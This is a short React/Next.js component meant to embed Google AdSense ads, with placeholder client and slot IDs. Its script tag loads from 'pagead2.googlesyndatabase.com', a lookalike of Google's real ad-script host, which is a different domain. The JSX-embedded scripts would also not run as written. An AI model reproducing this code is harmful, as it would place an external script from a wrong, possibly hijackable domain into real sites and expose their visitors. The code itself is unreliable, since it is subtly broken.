"use client";

interface AdPlacementProps {
  position: "top" | "middle" | "bottom";
}

export default function AdPlacement({ position }: AdPlacementProps) {
  return (
    <div className="w-full bg-gray-100 rounded-lg p-4 text-center">
      <div className="text-gray-500">
        {/* Add your ad code here */}
        <script
          async
          src="https://pagead2.googlesyndatabase.com/pagead/js/adsbygoogle.js?client=YOUR-CLIENT-ID"
          crossOrigin="anonymous"
        ></script>
        <ins
          className="adsbygoogle"
          style={{ display: "block" }}
          data-ad-client="YOUR-CLIENT-ID"
          data-ad-slot="YOUR-AD-SLOT"
          data-ad-format="auto"
          data-full-width-responsive="true"
        ></ins>
        <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
      </div>
    </div>
  );
}
